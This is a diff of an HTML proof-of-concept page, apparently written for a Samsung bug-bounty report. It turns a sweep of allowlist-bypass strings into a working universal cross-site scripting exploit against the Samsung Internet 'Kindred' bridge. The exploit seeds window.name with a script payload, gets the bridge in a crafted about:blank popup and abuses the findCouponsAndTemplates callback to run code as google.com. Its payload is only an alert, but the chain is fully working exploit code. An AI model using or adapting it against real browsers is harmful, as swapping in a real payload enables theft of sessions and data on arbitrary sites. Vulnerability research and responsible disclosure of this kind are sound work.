@@ -1,92 +1,122 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Kindred allowlist-bypass sweep (popup)</title>
-<style>
- body{max-width:760px;margin:30px auto;padding:0 18px;font:15px/1.5 system-ui,sans-serif}
- button{padding:12px 18px;font:inherit;font-weight:650;width:100%;margin:6px 0}
- textarea{width:100%;height:11em;font:12px/1.4 monospace;padding:8px}
- pre{min-height:12em;padding:12px;white-space:pre-wrap;overflow-wrap:anywhere;background:#f3f4f6;font-size:12px}
- .warn{color:#b23;font-size:12px}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Samsung Kindred UXSS — variant (direct-eval callback, benign)</title>
+  <style>
+    body { max-width: 760px; margin: 40px auto; padding: 0 20px; font: 16px/1.5 system-ui, sans-serif; }
+    button { padding: 12px 18px; font: inherit; font-weight: 650; width:100%; margin:6px 0; }
+    pre { min-height: 12em; padding: 14px; overflow-wrap: anywhere; white-space: pre-wrap; background: #f3f4f6; }
+    .warn{color:#b23;font-size:12px}
+  </style>
 </head>
 <body>
-<main id="main">
-<h1>Samsung Kindred — allowlist-bypass sweep (POPUP, matches your PoC)</h1>
-<p class="warn">Benign recon: reuses ONE popup (like your PoC) and detects whether each candidate materializes
-<code>KindredWebInterface</code>. First line is the KNOWN-GOOD control — if it shows "no bridge", the whole run is
-invalid (feature off / popups blocked), not a real negative.</p>
+  <main id="main">
+    <h1>Samsung Kindred UXSS — variant</h1>
+    <p class="warn">Benign: proof is alert(document.domain) only. No defacement, no data theft. Own build. Samsung Mobile Security Rewards.</p>
+    <p>allowlist-bypass trigger string (try any that the sweep showed works):</p>
+    <input id="trig" value="about:blank#x=amazon.com" style="width:100%;padding:9px;font:inherit;border:1px solid #ccc;border-radius:6px;margin:4px 0">
+    <button id="runDirect" type="button">A · run with DIRECT-EVAL callback: alert(document.domain)</button>
+    <button id="runName" type="button">fallback · run with callback: window.name.toString</button>
+    <pre id="log" aria-live="polite"></pre>
+  </main>
 
-<p>candidates (one per line; line 1 = control):</p>
-<textarea id="cands">about:blank#kindred-probe://amazon.com/
-about:blank#amazon.com
-about:blank?amazon.com
-about:blank#//amazon.com
-about:blank#.amazon.com
-about:blank#amazon.com.
-about:blank#AMAZON.COM
-about:blank#https://amazon.com
-about:blank#x=amazon.com
-about:blank#amazon.com/checkout
-about:blank#ebay.com
-about:blank#walmart.com
-about:blank#aliexpress.com
-about:blank#bestbuy.com
-about:blank#target.com</textarea>
-<button id="run" type="button">sweep via popup (~6s each)</button>
-<pre id="log"></pre>
-</main>
+  <script>
+  (() => {
+    'use strict';
 
-<script>
-(() => {
-'use strict';
-const params=new URLSearchParams(location.search);
-if(params.has('bootstrap')){ document.querySelector('#main').innerHTML='<h1>bootstrap</h1>'; return; }
+    const params = new URLSearchParams(location.search);
+    if (params.has('bootstrap')) {
+      document.querySelector('#main').innerHTML =
+        '<h1>Attacker bootstrap document</h1><p>Waiting for the parent controller.</p>';
+      return;
+    }
 
-const out=document.getElementById('log');
-function log(m){ const t=new Date().toISOString().slice(11,23); out.textContent+=`[${t}] ${m}\n`; }
-const vm=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
-log('SamsungBrowser='+(vm?vm[1]:'NOT DETECTED — open in Samsung Internet'));
+    const output = document.querySelector('#log');
+    const runDirect = document.querySelector('#runDirect');
+    const runName = document.querySelector('#runName');
+    let running = false;
 
-function bootstrapUrl(){ const u=new URL(location.href); u.searchParams.set('bootstrap',String(Date.now())); u.hash='attacker-bootstrap'; return u.href; }
+    function log(message) {
+      const stamp = new Date().toISOString().slice(11, 23);
+      output.textContent += `[${stamp}] ${message}\n`;
+    }
 
-// drive the SHARED popup through one candidate (same reload+poll as the PoC)
-function testOne(w, url){
-  return new Promise(res=>{
-    try{ w.location.replace(url); }catch(e){ res('nav err '+e); return; }
-    setTimeout(()=>{ try{ w.location.reload(); }catch(e){} }, 600);   // force commit so Kindred re-evaluates
-    const t0=performance.now();
-    const iv=setInterval(()=>{
-      let probe;
-      try{ probe = typeof w.KindredWebInterface; }
-      catch(e){ clearInterval(iv); res('cross-origin / unreadable'); return; }
-      if(probe!=='undefined'){ clearInterval(iv); res('BRIDGE PRESENT @+'+Math.round(performance.now()-t0)+'ms  <== STILL WORKS'); return; }
-      if(performance.now()-t0>5000){ clearInterval(iv); res('no bridge (5s)'); }
-    },100);
-  });
-}
+    const vm = /SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
+    log('SamsungBrowser=' + (vm ? vm[1] : 'NOT DETECTED — open in Samsung Internet'));
 
-async function sweep(){
-  const cands=document.getElementById('cands').value.split('\n').map(s=>s.trim()).filter(Boolean);
-  const w=open(bootstrapUrl(),'_blank');
-  if(!w){ log('popup blocked — allow popups and retry'); return; }
-  log('--- sweep '+cands.length+' candidates via popup (line 1 = control) ---');
-  for(let i=0;i<cands.length;i++){
-    const u=cands[i];
-    log((i===0?'CONTROL ':'test: ')+u);
-    const r=await testOne(w,u);
-    log('   => '+r);
-    if(i===0 && r.indexOf('BRIDGE')===-1){ log('*** CONTROL FAILED — known-good string shows no bridge. Run is INVALID (feature off, wrong build, or popup issue). Fix that before trusting the rest. ***'); }
-    try{ w.location.replace('about:blank'); }catch(e){}            // clear bridge before next
-    await new Promise(r=>setTimeout(r,600));
-  }
-  try{ w.close(); }catch(e){}
-  log('--- sweep done. "STILL WORKS" on a NON-control line after a passing control = a surviving bypass. ---');
-}
-document.getElementById('run').addEventListener('click', sweep);
-})();
-</script>
+    function bootstrapUrl() {
+      const url = new URL(location.href);
+      url.searchParams.set('bootstrap', String(Date.now()));
+      url.hash = 'attacker-bootstrap';
+      return url.href;
+    }
+
+    // BENIGN payload (was PWNED defacement). For the window.name.toString path.
+    const PAYLOAD = '<scr' + 'ipt>alert("BENIGN UXSS — ran as "+document.domain);document.write("<h1>BENIGN UXSS TEST — "+document.domain+"</h1>");</scr' + 'ipt>';
+
+    function run(cb) {
+      if (running) return;
+
+      const popup = open(bootstrapUrl(), '_blank');
+      if (!popup) { log('popup blocked; tap the button for the reliable path'); return; }
+
+      running = true;
+      runDirect.disabled = runName.disabled = true;
+      log('popup opened; callback="' + cb + '"');
+
+      popup.name = PAYLOAD;
+      log('seeded window.name with benign domain-proof payload');
+
+      const trig = (document.querySelector('#trig').value || 'about:blank#x=amazon.com').trim();
+      setTimeout(() => {
+        try { popup.location.replace(trig); log('navigated popup to bypass trigger: ' + trig); }
+        catch (error) { log(`about:blank navigation failed: ${error}`); }
+      }, 750);
+
+      setTimeout(() => {
+        try { popup.location.reload(); log('reloaded crafted about:blank to materialize KindredWebInterface'); }
+        catch (error) { log(`reload failed: ${error}`); }
+      }, 2000);
+
+      const started = performance.now();
+      const poll = setInterval(() => {
+        if (performance.now() - started > 20000) {
+          clearInterval(poll); running = false; runDirect.disabled = runName.disabled = false;
+          log('timed out waiting for KindredWebInterface');
+          return;
+        }
+        try {
+          if (typeof popup.KindredWebInterface === 'undefined') return;
+          clearInterval(poll);
+          log('KindredWebInterface acquired in attacker-origin document');
+
+          // enumerate once so renamed methods / other sinks are visible
+          try { const ms=[]; for (const k in popup.KindredWebInterface) ms.push(k); log('bridge methods: '+(ms.join(', ')||'(none enumerable)')); } catch(e){}
+
+          const guardProof = popup.KindredWebInterface.isCheckoutPage('amazon.com');
+          log(`guarded bridge method executed; result=${guardProof}`);
+
+          for (let i = 0; i < 10; i++) {
+            popup.KindredWebInterface.findCouponsAndTemplates(`uxss-delay-${Date.now()}-${i}.amazon.com`, '', 'console.log', 1);
+          }
+          popup.KindredWebInterface.findCouponsAndTemplates('amazon.com', '', cb, 1);
+          log(`queued findCouponsAndTemplates callback="${cb}"`);
+
+          popup.location.replace('https://www.google.com/');
+          log('navigated popup to unmodified https://www.google.com/ — if UXSS fires you get alert "ran as www.google.com"');
+          running = false; runDirect.disabled = runName.disabled = false;
+        } catch (error) {
+          clearInterval(poll); running = false; runDirect.disabled = runName.disabled = false;
+          log(`exploit setup failed: ${error}`);
+        }
+      }, 100);
+    }
+
+    runDirect.addEventListener('click', () => run('alert(document.domain)'));
+    runName.addEventListener('click', () => run('window.name.toString'));
+  })();
+  </script>
 </body>
 </html>
